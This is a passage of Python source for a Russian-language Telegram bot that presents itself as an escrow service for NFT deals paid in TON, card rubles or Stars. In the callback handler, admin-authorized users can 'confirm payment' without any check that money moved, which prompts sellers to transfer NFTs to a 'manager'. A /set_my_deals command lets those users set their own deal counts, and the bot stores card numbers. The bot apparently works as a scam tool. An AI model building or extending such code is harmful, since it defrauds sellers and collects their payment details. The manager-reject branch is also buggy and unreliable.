        elif currency == CURRENCY_RUB:
            card_number = deal_data.get('card', 'Не указан')
            payment_info = get_text(user_id, 'payment_info_card', context, card=card_number, deal_id=deal_id)
            warning = get_text(user_id, 'warning_card', context, amount=amount)
        else:
            payment_info = get_text(user_id, 'payment_info_stars', context, currency=currency, deal_id=deal_id)
            warning = get_text(user_id, 'warning_stars', context)

        deal_info_text = get_text(user_id, 'deal_info_buyer', context,
                                  deal_id=deal_id, seller=seller_username,
                                  description=deal_data['description'],
                                  payment_info=payment_info,
                                  amount=amount, unit=currency_unit,
                                  warning=warning)

        active_buyers[user_id] = deal_id

        await update.message.reply_text(
            deal_info_text,
            reply_markup=get_buyer_keyboard(deal_id, user_id, context),
            parse_mode='HTML'
        )

        await notify_seller_about_buyer(deal_id, buyer_username, user_id, context)

    except Exception as e:
        logger.error(f"Ошибка в handle_deal_link: {e}")
        try:
            await update.message.reply_text(
                get_text(user_id, 'error_occurred', context),
                reply_markup=get_main_keyboard(user_id, context)
            )
        except Exception as inner_e:
            logger.error(f"Ошибка при отправке сообщения об ошибке: {inner_e}")


async def show_seller_deal_info(update: Update, deal_id: str, context: ContextTypes.DEFAULT_TYPE):
    try:
        if deal_id not in deal_links:
            await update.message.reply_text(get_text(update.effective_user.id, 'deal_not_found', context))
            return

        deal_data = deal_links[deal_id]
        seller_id = deal_data['user_id']
        seller_deals_count = user_deals_count.get(seller_id, 0)
        currency = deal_data.get('currency', CURRENCY_TON)
        currency_unit = CURRENCY_UNITS.get(currency, "TON")
        bot_username = context.bot.username
        deal_link = f"https://t.me/{bot_username}?start={deal_id}"

        seller_info_text = get_text(seller_id, 'seller_deal_info', context,
                                    deal_id=deal_id, deals=seller_deals_count,
                                    description=deal_data['description'],
                                    amount=deal_data['amount'], unit=currency_unit,
                                    currency=currency, link=deal_link)

        await update.message.reply_text(
            seller_info_text,
            reply_markup=get_back_keyboard(seller_id, context)
        )

        logger.info(f"📋 Продавец {seller_id} просмотрел свою сделку {deal_id}")
    except Exception as e:
        logger.error(f"Ошибка в show_seller_deal_info: {e}")
        await update.message.reply_text(get_text(update.effective_user.id, 'error_occurred', context))


async def set_my_deals_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.message.from_user.id
        if not is_authorized_user(user_id):
            await update.message.reply_text(
                get_text(user_id, 'not_authorized', context),
                reply_markup=get_main_keyboard(user_id, context)
            )
            return

        if not context.args:
            current_deals = user_deals_count.get(user_id, 0)
            await update.message.reply_text(
                get_text(user_id, 'set_my_deals_current', context, deals=current_deals),
                reply_markup=get_main_keyboard(user_id, context)
            )
            return

        try:
            deals_count = int(context.args[0])
            if deals_count < 0:
                await update.message.reply_text(
                    get_text(user_id, 'set_my_deals_negative', context),
                    reply_markup=get_main_keyboard(user_id, context)
                )
                return

            user_deals_count[user_id] = deals_count
            await update.message.reply_text(
                get_text(user_id, 'set_my_deals_success', context, deals=deals_count),
                reply_markup=get_main_keyboard(user_id, context)
            )
        except ValueError:
            await update.message.reply_text(
                get_text(user_id, 'set_my_deals_invalid', context),
                reply_markup=get_main_keyboard(user_id, context)
            )
    except Exception as e:
        logger.error(f"Ошибка в set_my_deals_command: {e}")
        await update.message.reply_text(get_text(user_id, 'error_occurred', context))


async def my_stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.message.from_user.id
        if not is_authorized_user(user_id):
            await update.message.reply_text(
                get_text(user_id, 'not_authorized', context),
                reply_markup=get_main_keyboard(user_id, context)
            )
            return

        current_deals = user_deals_count.get(user_id, 0)
        username = update.message.from_user.username or "Пользователь"
        is_auth = is_authorized_user(user_id)
        balance = get_user_balance(user_id)

        can_wallet, wallet_status, _ = get_withdrawal_status(user_id, 'wallet', context)
        can_card, card_status, _ = get_withdrawal_status(user_id, 'card', context)

        wallet_info = f"🪙 TON-кошелек: {wallet_status}"
        card_info = f"💳 Карта: {card_status}"

        status_text = "✅ Авторизованный пользователь" if is_auth else "❌ Неавторизованный"
        functions = []
        if is_auth:
            functions.append(get_text(user_id, 'function_confirm_payment', context))
            functions.append(get_text(user_id, 'function_change_stats', context))
        else:
            functions.append(get_text(user_id, 'function_not_available', context))
        functions.append(get_text(user_id, 'function_view_stats', context))
        functions.append(get_text(user_id, 'function_withdraw', context))

        # Определяем, показывать ли строку о необходимости сделок
        if current_deals > 0:
            deals_requirement = get_text(user_id, 'deals_requirement', context, min_deals=MIN_DEALS_FOR_WITHDRAWAL)
        else:
            deals_requirement = ""

        await update.message.reply_text(
            get_text(user_id, 'my_stats', context,
                     username=username, user_id=user_id, deals=current_deals,
                     balance=balance, status=status_text,
                     wallet_info=wallet_info, card_info=card_info,
                     min_withdraw=MIN_WITHDRAWAL_AMOUNT,
                     deals_requirement=deals_requirement,
                     fee=SYSTEM_FEE_PERCENT, functions="\n".join(functions)),
            reply_markup=get_main_keyboard(user_id, context)
        )
    except Exception as e:
        logger.error(f"Ошибка в my_stats_command: {e}")
        await update.message.reply_text(get_text(user_id, 'error_occurred', context))


async def language_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    await update.message.reply_text(
        get_text(user_id, 'choose_language', context),
        reply_markup=get_language_keyboard()
    )


# ------------------ КОМАНДЫ АДМИНИСТРАТОРА ------------------
async def add_user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.message.from_user.id
        if user_id != ADMIN_ID:
            await update.message.reply_text("❌ Эта команда доступна только администратору")
            return

        if not context.args:
            await update.message.reply_text(
                "Использование: /add_user <user_id>\n"
                "Пример: /add_user 123456789"
            )
            return

        try:
            new_user_id = int(context.args[0])
            authorized_users.add(new_user_id)
            try:
                user_info = await context.bot.get_chat(new_user_id)
                username = user_info.username or f"ID: {new_user_id}"
            except:
                username = f"ID: {new_user_id}"
            await update.message.reply_text(
                f"✅ Пользователь @{username} (ID: {new_user_id}) добавлен в список авторизованных.\n"
                f"Теперь он может подтверждать оплаты в сделках."
            )
            logger.info(f"Админ {user_id} добавил пользователя {new_user_id} в авторизованные")
        except ValueError:
            await update.message.reply_text("❌ Неверный формат ID. Используйте целое число.")
    except Exception as e:
        logger.error(f"Ошибка в add_user_command: {e}")
        await update.message.reply_text("Произошла ошибка при добавлении пользователя")


async def remove_user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.message.from_user.id
        if user_id != ADMIN_ID:
            await update.message.reply_text("❌ Эта команда доступна только администратору")
            return

        if not context.args:
            await update.message.reply_text(
                "Использование: /remove_user <user_id>\n"
                "Пример: /remove_user 123456789"
            )
            return

        try:
            user_to_remove = int(context.args[0])
            if user_to_remove in authorized_users:
                authorized_users.remove(user_to_remove)
                await update.message.reply_text(
                    f"✅ Пользователь ID: {user_to_remove} удален из списка авторизованных."
                )
                logger.info(f"Админ {user_id} удалил пользователя {user_to_remove} из авторизованных")
            else:
                await update.message.reply_text("❌ Пользователь не найден в списке авторизованных.")
        except ValueError:
            await update.message.reply_text("❌ Неверный формат ID. Используйте целое число.")
    except Exception as e:
        logger.error(f"Ошибка в remove_user_command: {e}")
        await update.message.reply_text("Произошла ошибка при удалении пользователя")


async def list_users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.message.from_user.id
        if user_id != ADMIN_ID:
            await update.message.reply_text("❌ Эта команда доступна только администратору")
            return

        if not authorized_users:
            await update.message.reply_text("📭 Список авторизованных пользователей пуст.")
            return

        users_list = "📋 Авторизованные пользователи:\n\n"
        for idx, auth_user_id in enumerate(authorized_users, 1):
            try:
                user_info = await context.bot.get_chat(auth_user_id)
                username = user_info.username or "Без username"
                users_list += f"{idx}. @{username} (ID: {auth_user_id})\n"
            except:
                users_list += f"{idx}. ID: {auth_user_id} (не удалось получить информацию)\n"

        users_list += f"\nВсего: {len(authorized_users)} пользователей"
        await update.message.reply_text(users_list)
    except Exception as e:
        logger.error(f"Ошибка в list_users_command: {e}")
        await update.message.reply_text("Произошла ошибка при получении списка пользователей")


async def admin_balance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.message.from_user.id
        if user_id != ADMIN_ID:
            await update.message.reply_text("❌ Эта команда доступна только администратору")
            return

        total_balance = sum(user_balances.values())
        total_users = len(user_balances)
        total_pending_withdrawals = sum(w['amount'] for w in pending_withdrawals.values() if isinstance(w, dict))

        text = (
            f"💰 ОБЩАЯ СТАТИСТИКА БАЛАНСОВ\n\n"
            f"👥 Всего пользователей с балансом: {total_users}\n"
            f"💵 Общая сумма на балансах: {total_balance:.2f} руб\n"
            f"⏳ Ожидающие выводы: {total_pending_withdrawals:.2f} руб\n"
            f"👑 Комиссия системы: {SYSTEM_FEE_PERCENT}%\n"
            f"💸 Мин. вывод: {MIN_WITHDRAWAL_AMOUNT} руб\n"
            f"📊 Требуется сделок для вывода: {MIN_DEALS_FOR_WITHDRAWAL}\n\n"
            f"📋 ТОП-10 ПО БАЛАНСУ:\n"
        )

        sorted_users = sorted(user_balances.items(), key=lambda x: x[1], reverse=True)[:10]
        for idx, (uid, bal) in enumerate(sorted_users, 1):
            try:
                user_info = await context.bot.get_chat(uid)
                username = user_info.username or f"ID: {uid}"
                text += f"{idx}. @{username}: {bal:.2f} руб\n"
            except:
                text += f"{idx}. ID {uid}: {bal:.2f} руб\n"

        await update.message.reply_text(text)
    except Exception as e:
        logger.error(f"Ошибка в admin_balance_command: {e}")
        await update.message.reply_text("Произошла ошибка при получении статистики балансов")


# ------------------ ОБРАБОТЧИК КОЛБЭКОВ ------------------
async def handle_callback_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()

        user_id = query.from_user.id
        data = query.data

        if data.startswith("set_lang_"):
            lang = data.replace("set_lang_", "")
            if lang in [LANG_RU, LANG_EN]:
                context.user_data['language'] = lang
                await query.message.edit_text(
                    get_text(user_id, 'language_selected', context),
                    reply_markup=None
                )
                await send_main_menu_with_photo(query.message.chat_id, context)
            return

        if 'language' not in context.user_data:
            await query.message.reply_text(
                get_text(user_id, 'choose_language', context),
                reply_markup=get_language_keyboard()
            )
            return

        if data == "back_to_menu":
            await send_main_menu_with_photo(query.message.chat_id, context)
            return

        if data == "my_balance":
            balance = get_user_balance(user_id)
            username = query.from_user.username or "Пользователь"

            can_wallet, wallet_status, _ = get_withdrawal_status(user_id, 'wallet', context)
            can_card, card_status, _ = get_withdrawal_status(user_id, 'card', context)

            wallet_info = f"🪙 TON-кошелек: {wallet_status}"
            card_info = f"💳 Карта: {card_status}"

            deals = user_deals_count.get(user_id, 0)
            # Показываем требование о сделках только если есть 1 или 2 сделки
            if deals > 0 and deals < MIN_DEALS_FOR_WITHDRAWAL:
                deals_requirement = get_text(user_id, 'deals_requirement', context, min_deals=MIN_DEALS_FOR_WITHDRAWAL)
            else:
                deals_requirement = ""

            text = get_text(user_id, 'my_balance', context,
                            username=username, balance=balance,
                            wallet_info=wallet_info, card_info=card_info,
                            fee=SYSTEM_FEE_PERCENT, min_withdraw=MIN_WITHDRAWAL_AMOUNT,
                            deals_requirement=deals_requirement, deals=deals)
            await query.message.reply_text(text, reply_markup=get_balance_keyboard(user_id, context))
            return

        if data == "withdraw_funds":
            balance = get_user_balance(user_id)
            if balance < MIN_WITHDRAWAL_AMOUNT:
                await query.message.reply_text(
                    get_text(user_id, 'insufficient_balance', context,
                             balance=balance, min_withdraw=MIN_WITHDRAWAL_AMOUNT,
                             need=MIN_WITHDRAWAL_AMOUNT - balance),
                    reply_markup=get_back_keyboard(user_id, context)
                )
                return

            deals = user_deals_count.get(user_id, 0)
            if deals > 0 and deals < MIN_DEALS_FOR_WITHDRAWAL:
                deals_requirement = get_text(user_id, 'deals_requirement', context, min_deals=MIN_DEALS_FOR_WITHDRAWAL)
            else:
                deals_requirement = ""

            await query.message.reply_text(
                get_text(user_id, 'withdraw_funds', context,
                         balance=balance, min_withdraw=MIN_WITHDRAWAL_AMOUNT,
                         deals_requirement=deals_requirement),
                reply_markup=get_withdrawal_keyboard(user_id, context)
            )
            return

        if data == "withdraw_to_card":
            balance = get_user_balance(user_id)
            if balance < MIN_WITHDRAWAL_AMOUNT:
                await query.message.reply_text(
                    get_text(user_id, 'insufficient_balance', context,
                             balance=balance, min_withdraw=MIN_WITHDRAWAL_AMOUNT,
                             need=MIN_WITHDRAWAL_AMOUNT - balance),
                    reply_markup=get_back_keyboard(user_id, context)
                )
                return

            can_withdraw, status_text, needed = get_withdrawal_status(user_id, 'card', context)

            if not can_withdraw:
                if needed > 0:
                    # Показываем, сколько ещё нужно сделок
                    await query.message.reply_text(
                        get_text(user_id, 'withdraw_deficit', context,
                                 needed=needed, balance=balance, min_withdraw=MIN_WITHDRAWAL_AMOUNT,
                                 deals=user_deals_count.get(user_id, 0), min_deals=MIN_DEALS_FOR_WITHDRAWAL),
                        reply_markup=get_back_keyboard(user_id, context)
                    )
                else:
                    # Если нет карты
                    await query.message.reply_text(status_text, reply_markup=get_back_keyboard(user_id, context))
                return

            if user_id not in user_cards:
                await query.message.reply_text(
                    get_text(user_id, 'no_card', context),
                    reply_markup=get_back_keyboard(user_id, context)
                )
                return

            card_number = user_cards[user_id]
            context.user_data['withdraw_method'] = 'card'
            context.user_data['withdraw_details'] = card_number
            context.user_data['waiting_for_withdraw_amount'] = True
            await query.message.reply_text(
                get_text(user_id, 'withdraw_to_card', context,
                         card=card_number, status_text=status_text,
                         balance=balance, min_withdraw=MIN_WITHDRAWAL_AMOUNT),
                reply_markup=get_back_keyboard(user_id, context),
                parse_mode='HTML'
            )
            return

        if data == "withdraw_to_wallet":
            balance = get_user_balance(user_id)
            if balance < MIN_WITHDRAWAL_AMOUNT:
                await query.message.reply_text(
                    get_text(user_id, 'insufficient_balance', context,
                             balance=balance, min_withdraw=MIN_WITHDRAWAL_AMOUNT,
                             need=MIN_WITHDRAWAL_AMOUNT - balance),
                    reply_markup=get_back_keyboard(user_id, context)
                )
                return

            can_withdraw, status_text, needed = get_withdrawal_status(user_id, 'wallet', context)

            if not can_withdraw:
                if needed > 0:
                    await query.message.reply_text(
                        get_text(user_id, 'withdraw_deficit', context,
                                 needed=needed, balance=balance, min_withdraw=MIN_WITHDRAWAL_AMOUNT,
                                 deals=user_deals_count.get(user_id, 0), min_deals=MIN_DEALS_FOR_WITHDRAWAL),
                        reply_markup=get_back_keyboard(user_id, context)
                    )
                else:
                    await query.message.reply_text(status_text, reply_markup=get_back_keyboard(user_id, context))
                return

            if user_id not in user_wallets:
                await query.message.reply_text(
                    get_text(user_id, 'no_wallet', context),
                    reply_markup=get_back_keyboard(user_id, context)
                )
                return

            wallet_address = user_wallets[user_id]
            context.user_data['withdraw_method'] = 'TON'
            context.user_data['withdraw_details'] = wallet_address
            context.user_data['waiting_for_withdraw_amount'] = True
            await query.message.reply_text(
                get_text(user_id, 'withdraw_to_wallet', context,
                         wallet=wallet_address, status_text=status_text,
                         balance=balance, min_withdraw=MIN_WITHDRAWAL_AMOUNT),
                reply_markup=get_back_keyboard(user_id, context),
                parse_mode='HTML'
            )
            return

        if data == "transaction_history":
            await query.message.reply_text(
                get_text(user_id, 'transaction_history', context),
                reply_markup=get_balance_keyboard(user_id, context)
            )
            return

        if data == "manage_requisites":
            await query.message.reply_text(
                get_text(user_id, 'manage_requisites', context),
                reply_markup=get_requisites_keyboard(user_id, context)
            )
            return

        if data == "create_deal":
            await query.message.reply_text(
                get_text(user_id, 'create_deal_prompt', context),
                reply_markup=get_deal_keyboard(user_id, context)
            )
            return

        if data in ["deal_ton", "deal_card", "deal_stars"]:
            if data == "deal_ton":
                currency = CURRENCY_TON
            elif data == "deal_card":
                currency = CURRENCY_RUB
                if user_id not in user_cards:
                    await query.message.reply_text(
                        get_text(user_id, 'no_card', context),
                        reply_markup=get_back_keyboard(user_id, context)
                    )
                    return
            else:
                currency = CURRENCY_STARS
            context.user_data['deal_currency'] = currency
            unit = CURRENCY_UNITS.get(currency, "TON")
            await query.message.reply_text(
                get_text(user_id, 'enter_amount', context, unit=unit),
                reply_markup=get_back_keyboard(user_id, context)
            )
            context.user_data['creating_deal'] = True
            context.user_data['deal_stage'] = 'amount'
            return

        if data == "add_wallet":
            current_wallet = user_wallets.get(user_id)
            if current_wallet:
                can_withdraw, status_text, needed = get_withdrawal_status(user_id, 'wallet', context)
                await query.message.reply_text(
                    get_text(user_id, 'add_wallet_change', context,
                             wallet=current_wallet, status=status_text,
                             min_withdraw=MIN_WITHDRAWAL_AMOUNT),
                    reply_markup=get_back_keyboard(user_id, context),
                    parse_mode='HTML'
                )
            else:
                await query.message.reply_text(
                    get_text(user_id, 'add_wallet_prompt', context,
                             min_withdraw=MIN_WITHDRAWAL_AMOUNT),
                    reply_markup=get_back_keyboard(user_id, context),
                    parse_mode='HTML'
                )
            context.user_data['waiting_for_wallet'] = True
            context.user_data['waiting_for_card'] = False
            return

        if data == "add_card":
            current_card = user_cards.get(user_id)
            if current_card:
                can_withdraw, status_text, needed = get_withdrawal_status(user_id, 'card', context)
                await query.message.reply_text(
                    get_text(user_id, 'add_card_change', context,
                             card=current_card, status=status_text,
                             min_withdraw=MIN_WITHDRAWAL_AMOUNT),
                    reply_markup=get_back_keyboard(user_id, context),
                    parse_mode='HTML'
                )
            else:
                await query.message.reply_text(
                    get_text(user_id, 'add_card_prompt', context,
                             min_withdraw=MIN_WITHDRAWAL_AMOUNT),
                    reply_markup=get_back_keyboard(user_id, context),
                    parse_mode='HTML'
                )
            context.user_data['waiting_for_card'] = True
            context.user_data['waiting_for_wallet'] = False
            return

        if data == "referral_system":
            await query.message.reply_text(
                get_text(user_id, 'referral_system', context),
                reply_markup=get_back_keyboard(user_id, context)
            )
            return

        if data == "support":
            await query.message.reply_text(
                get_text(user_id, 'support_message', context),
                reply_markup=get_support_keyboard(user_id, context)
            )
            return

        if data.startswith("confirm_payment_"):
            deal_id = data.replace("confirm_payment_", "")
            if deal_id not in deal_links:
                await query.message.reply_text(get_text(user_id, 'deal_not_found', context))
                return
            if user_id not in active_buyers or active_buyers[user_id] != deal_id:
                await query.message.reply_text(
                    get_text(user_id, 'not_buyer', context),
                    reply_markup=get_main_keyboard(user_id, context)
                )
                return
            is_authorized = is_authorized_user(user_id)
            if not is_authorized:
                deal_data = deal_links[deal_id]
                currency = deal_data.get('currency', CURRENCY_TON)
                currency_unit = CURRENCY_UNITS.get(currency, "TON")
                await query.message.reply_text(
                    get_text(user_id, 'payment_confirmed_unauthorized', context,
                             amount=deal_data['amount'], unit=currency_unit,
                             description=deal_data['description'], deal_id=deal_id),
                    reply_markup=get_back_keyboard(user_id, context)
                )
                logger.info(
                    f"⏳ Неавторизованный пользователь {user_id} нажал подтверждение оплаты для сделки {deal_id}")
                return
            buyer_username = query.from_user.username or "Пользователь"
            seller_notified = await notify_seller_about_payment(deal_id, buyer_username, user_id, context)
            buyer_notified = await notify_buyer_about_payment_confirmation(deal_id, user_id, context)
            active_buyers.pop(user_id, None)
            if seller_notified and buyer_notified:
                current_deals = user_deals_count.get(user_id, 0)
                await query.message.reply_text(
                    get_text(user_id, 'payment_confirmed_authorized', context, deals=current_deals),
                    reply_markup=get_main_keyboard(user_id, context)
                )
            else:
                await query.message.reply_text(
                    get_text(user_id, 'payment_confirmation_error', context),
                    reply_markup=get_main_keyboard(user_id, context)
                )
            return

        if data == "exit_deal":
            active_buyers.pop(user_id, None)
            await send_main_menu_with_photo(query.message.chat_id, context)
            return

        if data.startswith("request_transfer_"):
            deal_id = data.replace("request_transfer_", "")
            if deal_id not in deal_links or deal_id not in seller_transfers:
                await query.message.reply_text(get_text(user_id, 'deal_not_found', context))
                return
            deal_data = deal_links[deal_id]
            if user_id != deal_data['user_id']:
                await query.message.reply_text(get_text(user_id, 'not_seller', context))
                return
            if seller_transfers[deal_id]['transfer_requested']:
                await query.message.reply_text("❌ Заявка на передачу уже подана. Ожидайте подтверждения менеджера.")
                return
            seller_transfers[deal_id]['transfer_requested'] = True
            seller_transfers[deal_id]['seller_confirmed'] = True
            seller_username = query.from_user.username or deal_data.get('username', 'Продавец')
            managers_notified = await notify_managers_about_transfer_request(deal_id, seller_username, context)
            net_amount = seller_transfers[deal_id]['net_amount']
            if managers_notified:
                await query.message.reply_text(
                    get_text(user_id, 'transfer_request_submitted', context,
                             deal_id=deal_id, description=deal_data['description'], net=net_amount),
                    reply_markup=get_back_keyboard(user_id, context)
                )
                logger.info(f"✅ Продавец {user_id} подал заявку на передачу NFT для сделки {deal_id}")
            else:
                await query.message.reply_text(
                    get_text(user_id, 'transfer_request_error', context),
                    reply_markup=get_main_keyboard(user_id, context)
                )
            return

        if data.startswith("manager_confirm_"):
            deal_id = data.replace("manager_confirm_", "")
            if not is_manager(user_id):
                await query.message.reply_text("❌ Эта функция доступна только менеджерам")
                return
            if deal_id not in deal_links or deal_id not in seller_transfers:
                await query.message.reply_text(get_text(user_id, 'deal_not_found', context))
                return
            if not seller_transfers[deal_id]['transfer_requested']:
                await query.message.reply_text("❌ Продавец еще не подал заявку на передачу NFT")
                return
            if seller_transfers[deal_id]['manager_confirmed']:
                await query.message.reply_text("❌ Передача уже была подтверждена менеджером ранее")
                return
            seller_transfers[deal_id]['manager_confirmed'] = True
            buyer_notified = await notify_buyer_about_transfer_confirmation(deal_id, context)
            seller_notified = await notify_seller_about_manager_confirmation(deal_id, context)
            admin_notified = await notify_admin_about_completed_deal(deal_id, context)
            net_amount = seller_transfers[deal_id]['net_amount']
            if buyer_notified and seller_notified:
                await query.message.reply_text(
                    get_text(user_id, 'manager_confirmed', context, net=net_amount),
                    reply_markup=get_back_keyboard(user_id, context)
                )
                logger.info(f"✅ Менеджер {user_id} подтвердил получение NFT для сделки {deal_id}")
            else:
                await query.message.reply_text(
                    get_text(user_id, 'manager_action_error', context),
                    reply_markup=get_main_keyboard(user_id, context)
                )
            return

        if data.startswith("manager_reject_"):
            deal_id = data.replace("manager_reject_", "")
            if not is_manager(user_id):
                await query.message.reply_text("❌ Эта функция доступна только менеджерам")
                return
            if deal_id not in deal_links or deal_id not in seller_transfers:
                await query.message.reply_text(get_text(user_id, 'deal_not_found', context))
                return
            seller_transfers[deal_id]['transfer_requested'] = False
            seller_transfers[deal_id]['seller_confirmed'] = False
            seller_notified = await notify_seller_about_manager_rejection(deal_id, context)
            if seller_notified:
                await query.message.reply_text(
                    get_text(user_id, 'manager_confirmed', context, deal_id=deal_id, net=net_amount),
                    reply_markup=get_back_keyboard(user_id, context)
                )
                logger.info(f"❌ Менеджер {user_id} отклонил заявку на передачу NFT для сделки {deal_id}")
            else:
                await query.message.reply_text(
                    get_text(user_id, 'manager_action_error', context),
                    reply_markup=get_main_keyboard(user_id, context)
                )
            return

        if data.startswith("cancel_deal_"):
            deal_id = data.replace("cancel_deal_", "")
            if deal_id not in deal_links:
                await query.message.reply_text(get_text(user_id, 'deal_not_found', context))
                return
            deal_data = deal_links[deal_id]
            if user_id != deal_data['user_id']:
                await query.message.reply_text(get_text(user_id, 'not_seller', context))
                return
            if deal_id in deal_links:
                del deal_links[deal_id]
            if deal_id in seller_transfers:
                del seller_transfers[deal_id]
            for buyer_id, active_deal_id in list(active_buyers.items()):
                if active_deal_id == deal_id:
                    del active_buyers[buyer_id]
                    try:
                        await context.bot.send_message(
                            chat_id=buyer_id,
                            text=get_text(buyer_id, 'buyer_deal_cancelled', context, deal_id=deal_id),
                            reply_markup=get_main_keyboard(buyer_id, context)
                        )
                    except:
                        pass
            await query.message.reply_text(
                get_text(user_id, 'deal_cancelled', context, deal_id=deal_id),
                reply_markup=get_main_keyboard(user_id, context)
            )
            logger.info(f"❌ Сделка {deal_id} отменена продавцом {user_id}")
            return

    except Exception as e:
        logger.error(f"Ошибка в handle_callback_query: {e}")
        try:
            await update.callback_query.message.reply_text("Произошла ошибка. Пожалуйста, попробуйте еще раз.")
        except:
            pass


# ------------------ ОБРАБОТЧИК СООБЩЕНИЙ ------------------
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not update.message:
            return
        text = update.message.text
        user_id = update.message.from_user.id

        if 'language' not in context.user_data:
            await update.message.reply_text(
                get_text(user_id, 'choose_language', context),
                reply_markup=get_language_keyboard()
            )
            return

        if context.user_data.get('creating_deal'):
            deal_stage = context.user_data.get('deal_stage')
            if deal_stage == 'amount':
                try:
                    amount = float(text)
                    if amount <= 0:
                        raise ValueError("Negative amount")
                    context.user_data['deal_amount'] = amount
                    context.user_data['deal_stage'] = 'description'
                    currency = context.user_data.get('deal_currency', CURRENCY_TON)
                    currency_unit = CURRENCY_UNITS.get(currency, "TON")
                    await update.message.reply_text(
                        get_text(user_id, 'enter_description', context,
                                 amount=amount, unit=currency_unit),
                        reply_markup=get_back_keyboard(user_id, context)
                    )
                except ValueError:
                    currency = context.user_data.get('deal_currency', CURRENCY_TON)
                    currency_unit = CURRENCY_UNITS.get(currency, "TON")
                    await update.message.reply_text(
                        get_text(user_id, 'invalid_amount', context, unit=currency_unit),
                        reply_markup=get_back_keyboard(user_id, context)
                    )
            elif deal_stage == 'description':
                description = text.strip()
                context.user_data['deal_description'] = description
                deal_id = generate_deal_id()
                currency = context.user_data.get('deal_currency', CURRENCY_TON)
                deal_data = {
                    'user_id': user_id,
                    'amount': context.user_data['deal_amount'],
                    'description': description,
                    'wallet': user_wallets.get(user_id, 'Не указан'),
                    'card': user_cards.get(user_id, 'Не указан'),
                    'username': update.message.from_user.username or 'Пользователь',
                    'currency': currency
                }
                deal_links[deal_id] = deal_data
                currency_unit = CURRENCY_UNITS.get(currency, "TON")
                bot_username = context.bot.username
                deal_link = f"https://t.me/{bot_username}?start={deal_id}"
                await update.message.reply_text(
                    get_text(user_id, 'deal_created', context,
                             amount=context.user_data['deal_amount'],
                             unit=currency_unit, currency=currency,
                             description=description, link=deal_link),
                    reply_markup=get_back_keyboard(user_id, context)
                )
                for key in ['creating_deal', 'deal_stage', 'deal_amount', 'deal_description', 'deal_currency']:
                    context.user_data.pop(key, None)

        elif context.user_data.get('waiting_for_withdraw_amount'):
            try:
                amount = float(text)
                if amount < MIN_WITHDRAWAL_AMOUNT:
                    await update.message.reply_text(
                        get_text(user_id, 'insufficient_balance', context,
                                 balance=get_user_balance(user_id),
                                 min_withdraw=MIN_WITHDRAWAL_AMOUNT,
                                 need=MIN_WITHDRAWAL_AMOUNT - amount),
                        reply_markup=get_back_keyboard(user_id, context)
                    )
                    return
                balance = get_user_balance(user_id)
                if amount > balance:
                    await update.message.reply_text(
                        get_text(user_id, 'insufficient_balance', context,
                                 balance=balance,
                                 min_withdraw=MIN_WITHDRAWAL_AMOUNT,
                                 need=amount - balance),
                        reply_markup=get_back_keyboard(user_id, context)
                    )
                    return
                method = context.user_data.get('withdraw_method', 'Не указан')
                details = context.user_data.get('withdraw_details', 'Не указаны')

                # Проверяем возможность вывода (на случай если пользователь изменил реквизиты после начала операции)
                if method == 'card':
                    can_withdraw, _, needed = get_withdrawal_status(user_id, 'card', context)
                    if not can_withdraw:
                        await update.message.reply_text(
                            get_text(user_id, 'withdraw_deficit', context,
                                     needed=needed, balance=balance,
                                     min_withdraw=MIN_WITHDRAWAL_AMOUNT,
                                     deals=user_deals_count.get(user_id, 0),
                                     min_deals=MIN_DEALS_FOR_WITHDRAWAL),
                            reply_markup=get_back_keyboard(user_id, context)
                        )
                        return
                elif method == 'TON':
                    can_withdraw, _, needed = get_withdrawal_status(user_id, 'wallet', context)
                    if not can_withdraw:
                        await update.message.reply_text(
                            get_text(user_id, 'withdraw_deficit', context,
                                     needed=needed, balance=balance,
                                     min_withdraw=MIN_WITHDRAWAL_AMOUNT,
                                     deals=user_deals_count.get(user_id, 0),
                                     min_deals=MIN_DEALS_FOR_WITHDRAWAL),
                            reply_markup=get_back_keyboard(user_id, context)
                        )
                        return
                else:
                    # Неизвестный метод
                    await update.message.reply_text(
                        "❌ Неизвестный метод вывода",
                        reply_markup=get_back_keyboard(user_id, context)
                    )
                    return

                success = await process_withdrawal(user_id, amount, method, details, context)
                context.user_data.pop('waiting_for_withdraw_amount', None)
                context.user_data.pop('withdraw_method', None)
                context.user_data.pop('withdraw_details', None)
                if not success:
                    await update.message.reply_text(
                        get_text(user_id, 'withdraw_error', context),
                        reply_markup=get_main_keyboard(user_id, context)
                    )
            except ValueError:
                await update.message.reply_text(
                    "❌ НЕВЕРНЫЙ ФОРМАТ СУММЫ!\n\n"
                    "Пожалуйста, введите число в формате: 1000.50",
                    reply_markup=get_back_keyboard(user_id, context)
                )

        elif context.user_data.get('waiting_for_wallet'):
            wallet_address = text.strip()
            if len(wallet_address) < 10:
                await update.message.reply_text(
                    get_text(user_id, 'invalid_wallet', context),
                    reply_markup=get_back_keyboard(user_id, context)
                )
                return
            user_wallets[user_id] = wallet_address
            context.user_data['waiting_for_wallet'] = False
            deals = user_deals_count.get(user_id, 0)
            await update.message.reply_text(
                get_text(user_id, 'wallet_saved', context,
                         wallet=wallet_address,
                         min_withdraw=MIN_WITHDRAWAL_AMOUNT,
                         fee=SYSTEM_FEE_PERCENT,
                         deals=deals),
                reply_markup=get_back_keyboard(user_id, context),
                parse_mode='HTML'
            )

        elif context.user_data.get('waiting_for_card'):
            card_number = text.strip()
            if len(card_number) < 16 or not card_number.isdigit():
                await update.message.reply_text(
                    get_text(user_id, 'invalid_card', context),
                    reply_markup=get_back_keyboard(user_id, context)
                )
                return
            user_cards[user_id] = card_number
            context.user_data['waiting_for_card'] = False
            deals = user_deals_count.get(user_id, 0)
            await update.message.reply_text(
                get_text(user_id, 'card_saved', context,
                         card=card_number,
                         min_withdraw=MIN_WITHDRAWAL_AMOUNT,
                         fee=SYSTEM_FEE_PERCENT,
                         deals=deals),
                reply_markup=get_back_keyboard(user_id, context),
                parse_mode='HTML'
            )

